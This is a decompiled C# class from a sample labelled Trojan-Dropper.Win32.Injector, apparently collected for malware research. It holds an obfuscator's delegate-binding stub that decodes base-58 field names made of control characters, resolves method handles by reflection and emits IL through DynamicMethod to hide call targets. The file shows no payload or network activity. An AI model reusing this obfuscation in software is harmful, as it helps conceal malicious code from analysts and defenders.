// Decompiled with JetBrains decompiler
// Type: .
// Assembly: file, Version=11.0.0.0, Culture=neutral, PublicKeyToken=71f2cf7c2509b8fe
// MVID: 1F473243-1123-401F-8099-7648B7C34C41
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Injector.deqx-3dcf304237ebec8756d9362ccf0259126c1c62ff5c0b09096876be2cdc64ae5a.exe

using \u0001;
using \u0008;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal static class \u0002
  {
    private static ModuleHandle \u0001;
    private static char[] \u0001;

    public static void \u0002([In] int obj0)
    {
      Type typeFromHandle;
      FieldInfo[] fieldInfoArray;
      int index1;
      FieldInfo fieldInfo1;
      string str;
      int index2;
      char ch;
      bool flag;
      int index3;
      int num1;
      MethodInfo methodFromHandle;
      Delegate @delegate;
      ParameterInfo[] parameters;
      int length;
      Type[] parameterTypes;
      int index4;
      DynamicMethod dynamicMethod;
      ILGenerator ilGenerator;
      int num2;
      try
      {
        try
        {
          typeFromHandle = Type.GetTypeFromHandle(\u0002.\u0001.ResolveTypeHandle(33554433 + obj0));
        }
        catch
        {
          return;
        }
        if (true)
        {
          if (true)
          {
            FieldInfo[] fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
            if (true)
              goto label_51;
label_5:
            if (true)
            {
              index1 = 0;
              goto label_50;
            }
            else
              goto label_50;
label_51:
            fieldInfoArray = fields;
            goto label_5;
          }
          else
            goto label_44;
        }
label_28:
        parameters = methodFromHandle.GetParameters();
        int num3 = parameters.Length;
        int num4 = 1;
label_29:
        length = num3 + num4;
        parameterTypes = new Type[length];
        parameterTypes[0] = typeof (object);
        for (index4 = 1; index4 < length; ++index4)
        {
          if (true)
            parameterTypes[index4] = parameters[index4 - 1].ParameterType;
          else
            goto label_35;
        }
        dynamicMethod = new DynamicMethod(string.Empty, methodFromHandle.ReturnType, parameterTypes, typeFromHandle, true);
        ilGenerator = dynamicMethod.GetILGenerator();
        ilGenerator.Emit(OpCodes.Ldarg_0);
        if (length > 1)
          ilGenerator.Emit(OpCodes.Ldarg_1);
label_35:
        int num5 = length;
        int num6 = 2;
label_36:
        if (num5 > num6)
          ilGenerator.Emit(OpCodes.Ldarg_2);
        if (length > 3)
          ilGenerator.Emit(OpCodes.Ldarg_3);
        if (length > 4)
        {
          for (num2 = 4; num2 < length; ++num2)
            ilGenerator.Emit(OpCodes.Ldarg_S, num2);
        }
label_44:
        ilGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodFromHandle);
        ilGenerator.Emit(OpCodes.Ret);
        try
        {
          @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
        }
        catch
        {
          goto label_49;
        }
label_47:
        try
        {
          fieldInfo1.SetValue((object) null, (object) @delegate);
        }
        catch
        {
        }
label_49:
        ++index1;
label_50:
        if (index1 >= fieldInfoArray.Length)
          return;
        FieldInfo fieldInfo2 = fieldInfoArray[index1];
        if (true)
          goto label_53;
label_8:
        string name = fieldInfo1.Name;
        if (true)
          goto label_54;
label_9:
        if (true)
          goto label_55;
label_10:
        if (true)
          goto label_56;
label_11:
        for (index2 = str.Length - 1; index2 >= 0; --index2)
        {
          ch = str[index2];
          if (ch == '~')
          {
            flag = true;
            break;
          }
          int num7;
          int num8;
          for (index3 = 0; index3 < 58; index3 = num7 + num8)
          {
            if ((int) \u0002.\u0001[index3] == (int) ch)
            {
              int num9 = num1 * 58;
              int num10 = index3;
              if (true)
              {
                num1 = num9 + num10;
                break;
              }
              num4 = num10;
              num3 = num9;
              goto label_29;
            }
            else
            {
              num7 = index3;
              num8 = 1;
              if (num8 == 0)
              {
                num6 = num8;
                num5 = num7;
                goto label_36;
              }
            }
          }
        }
        try
        {
          methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\u0002.\u0001.ResolveMethodHandle(num1 + 167772161));
        }
        catch
        {
          goto label_49;
        }
        if (methodFromHandle.IsStatic)
        {
          try
          {
            @delegate = Delegate.CreateDelegate(fieldInfo1.FieldType, methodFromHandle);
            goto label_47;
          }
          catch (Exception ex)
          {
            goto label_49;
          }
        }
        else
          goto label_28;
label_56:
        num1 = 0;
        goto label_11;
label_55:
        flag = false;
        goto label_10;
label_54:
        str = name;
        goto label_9;
label_53:
        fieldInfo1 = fieldInfo2;
        goto label_8;
      }
      catch (Exception ex)
      {
        object[] objects = new object[20]
        {
          (object) typeFromHandle,
          (object) fieldInfo1,
          (object) str,
          (object) flag,
          (object) num1,
          (object) index2,
          (object) ch,
          (object) index3,
          (object) methodFromHandle,
          (object) @delegate,
          (object) parameters,
          (object) length,
          (object) parameterTypes,
          (object) index4,
          (object) dynamicMethod,
          (object) ilGenerator,
          (object) num2,
          (object) fieldInfoArray,
          (object) index1,
          (object) obj0
        };
        \u0004.\u0002(ex, objects);
        throw;
      }
    }

    static \u0002()
    {
      Type type1;
      try
      {
        \u0002.\u0001 = new char[58]
        {
          '\u0001',
          '\u0002',
          '\u0003',
          '\u0004',
          '\u0005',
          '\u0006',
          '\a',
          '\b',
          '\u000E',
          '\u000F',
          '\u0010',
          '\u0011',
          '\u0012',
          '\u0013',
          '\u0014',
          '\u0015',
          '\u0016',
          '\u0017',
          '\u0018',
          '\u0019',
          '\u001A',
          '\u001B',
          '\u001C',
          '\u001D',
          '\u001E',
          '\u001F',
          '\u007F',
          '\u0080',
          '\u0081',
          '\u0082',
          '\u0083',
          '\u0084',
          '\u0086',
          '\u0087',
          '\u0088',
          '\u0089',
          '\u008A',
          '\u008B',
          '\u008C',
          '\u008D',
          '\u008E',
          '\u008F',
          '\u0090',
          '\u0091',
          '\u0092',
          '\u0093',
          '\u0094',
          '\u0095',
          '\u0096',
          '\u0097',
          '\u0098',
          '\u0099',
          '\u009A',
          '\u009B',
          '\u009C',
          '\u009D',
          '\u009E',
          '\u009F'
        };
        if (true)
        {
          Type type2 = typeof (MulticastDelegate);
          if (true)
            type1 = type2;
        }
        do
        {
          if ((object) type1 != null)
            \u0002.\u0001 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
        }
        while (false);
      }
      catch (Exception ex)
      {
        Type o1 = type1;
        \u0004.\u0002(ex, (object) o1);
        throw;
      }
    }
  }
}
